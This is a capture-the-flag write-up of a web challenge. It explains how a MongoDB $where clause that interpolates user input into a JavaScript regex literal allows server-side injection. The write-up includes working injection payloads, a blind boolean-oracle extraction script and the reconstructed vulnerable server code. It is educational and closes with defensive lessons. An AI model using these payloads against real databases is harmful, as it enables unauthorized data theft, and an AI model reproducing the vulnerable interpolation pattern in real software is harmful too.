# CVE DB

**Category:** web | **Points:** 500 | **Solves:** 1 | **Author:** @gehaxelt
**Flag:** `ENO{This_1s_A_Tru3_S1mpl3_Ch4llenge_T0_Solv3_Congr4tz}`

## Overview

An Express/MongoDB web app that lets you search a CVE database. User input is interpolated directly into a JavaScript regex literal inside a MongoDB `$where` clause, enabling server-side JavaScript injection and blind data exfiltration from hidden document fields.

## Reconnaissance

The challenge serves a single-page app at `http://52.59.124.14:5000` with a search form that POSTs to `/search`. The description — *"Let's implement our own CVE database with modern web-scale technologies, so without actual SQL"* — strongly hints at MongoDB (the infamous "web-scale" meme).

The search returns 26 CVE entries. One immediately stands out:

```
CVE-1337-1337 | Published: 1970-01-01 | Critical
"This CVE leaks some very confidential flag."
```

The HTML source reveals commented-out fields in the template:

```html
<!-- <div class="cve-product">TODO cve.product</div> -->
<!-- <div class="cve-vendor">TODO cve.vendor</div> -->
```

These are literal TODO comments (not template expressions), so the `product` and `vendor` fields exist in the database but are never rendered. The flag must be hiding in one of them.

## Fingerprinting the Search Backend

Basic testing shows the search uses **regex matching** against `cveId` and `description`:

| Query | Result | Interpretation |
|-------|--------|----------------|
| `CVE` | 26 results | Matches all CVE IDs |
| `1337` | 1 result | Matches CVE-1337-1337 |
| `flag` | 1 result | Matches "confidential flag." in description |
| `^CVE-1337-1337$` | 1 result | Regex anchors work |
| `CVE\|flag` | 26 results | Regex alternation works |
| `[` | Database error | Invalid regex → error |
| `(` | Database error | Unterminated group → error |
| `ENO` | 0 results | Not in any searchable field |

Sending invalid JSON to the body-parser leaked a stack trace confirming the app runs from `/app/` inside a container using Express with `body-parser`.

## Discovering the Injection

The breakthrough came from testing what happens when `/` (forward slash) appears in the query. If the server code embeds the query directly into a JavaScript regex literal like `/${query}/i`, then `/` would close the literal and expose a code injection point.

Testing the payload `a/i)||true||(/a`:

```
POST /search
query=a/i)||true||(/a    →  Found 26 results (always true!)
query=a/i)&&false&&(/a   →  0 results (always false!)
```

This confirms **JavaScript injection via regex literal interpolation**. The server-side code is approximately:

```javascript
// MongoDB $where with string-interpolated regex
db.collection.find({
  $where: function() {
    return (/${query}/i.test(this.cveId)) || (/${query}/i.test(this.description))
  }
})
```

### How the injection works

The injection `a/i) && CONDITION && (/a` gets substituted into the template:

```javascript
// Before injection:
(/QUERY/i.test(this.cveId)) || (/QUERY/i.test(this.description))

// After injection with query = "a/i) && true && (/a":
(/a/i) && true && (/a/i.test(this.cveId)) || (/a/i) && true && (/a/i.test(this.description))
```

Parsing this expression step by step:

```
(/a/i)                          → regex literal (truthy)
  && true                       → AND true
  && (/a/i.test(this.cveId))    → AND regex test on cveId
||
(/a/i)                          → regex literal (truthy)
  && true                       → AND true
  && (/a/i.test(this.description)) → AND regex test on description
```

The parentheses balance perfectly because each `/${query}/i.test(...)` in the template contributes one `(` before and one `)` after, and our injection closes the first `)` and opens the next `(`.

## Enumerating the Document Schema

Using the injection oracle (1 result = true, 0 results = false, error = invalid JS), I enumerated the MongoDB document fields accessible via `this`:

```python
def inject(condition):
    query = f"1337/i) && {condition} && (/1337"
    # returns 1 (true), 0 (false), or "ERROR"
```

| Condition | Result | Meaning |
|-----------|--------|---------|
| `true` | 1 | Injection works |
| `false` | 0 | Injection works |
| `this` | 1 | `this` is the document object |
| `typeof this === 'object'` | 1 | Confirmed object |
| `this._id` | truthy | MongoDB ObjectId exists |
| `this.cveId` | truthy | CVE identifier field |
| `this.severity` | truthy | Severity rating |
| `this.description` | truthy | Description text |
| `this.product` | truthy | Hidden field! |
| `this.vendor` | truthy | Hidden field! |
| `this.flag` | falsy | No `flag` field |
| `Object.keys(this).length > 6` | 1 | 7 keys total |
| `Object.keys(this).length > 7` | 0 | Exactly 7 keys |

The 7th key is likely `date` (stored as epoch 0 → falsy for CVE-1337-1337's `1970-01-01`).

## Locating the Flag

```python
inject("this.product.indexOf('ENO{') >= 0")  # → 1 (TRUE!)
inject("this.vendor.indexOf('ENO') >= 0")    # → 1 (also contains ENO)
```

The flag is in `this.product` (and partially mirrored in `this.vendor`).

## Extracting the Flag

### Step 1: Find the length

```python
for length in range(10, 100):
    if inject(f"this.product.length === {length}") == 1:
        print(f"Flag length: {length}")  # → 54
        break
```

### Step 2: Extract character by character

Using `charCodeAt()` to compare each position against its ASCII code:

```python
for i in range(54):
    for c in charset:
        if inject(f"this.product.charCodeAt({i}) === {ord(c)}") == 1:
            flag += c
            break
```

After ~54 × ~30 (average) = ~1600 requests:

```
ENO{This_1s_A_Tru3_S1mpl3_Ch4llenge_T0_Solv3_Congr4tz}
```

The full exploit is in [`solve.py`](solve.py).

## Probable Server-Side Code

Based on all observations, the vulnerable code is likely:

```javascript
const express = require('express');
const { MongoClient } = require('mongodb');
const app = express();

app.use(express.urlencoded({ extended: true }));
app.use(express.json());

app.post('/search', async (req, res) => {
  const query = req.body.query;
  try {
    // VULNERABLE: user input interpolated into $where JS
    const results = await collection.find({
      $where: `(/${query}/i.test(this.cveId)) || (/${query}/i.test(this.description))`
    }).toArray();

    res.render('index', { results, query });
  } catch (e) {
    res.render('index', { error: 'There was a database error.', query });
  }
});
```

The template renders only `cveId`, `description`, `date`, and `severity`, while `product` and `vendor` exist in the documents but are hidden from display.

## Key Takeaways

- **Regex literal interpolation is code injection.** Embedding user input inside `/${input}/` in JavaScript is equivalent to `eval()` — the `/` character closes the literal and everything after executes as code.
- **MongoDB `$where` is dangerous.** It executes server-side JavaScript where `this` is the full document, giving access to all fields regardless of what the application chooses to display. MongoDB's documentation explicitly warns against using `$where` with user input.
- **Blind boolean oracles are powerful.** Even without direct output, a single bit of information (result count > 0 vs. = 0) is enough to extract arbitrary data, one character at a time.
- **"Without actual SQL" doesn't mean safe.** NoSQL injection, especially through MongoDB's JavaScript evaluation features, can be just as devastating as SQL injection.
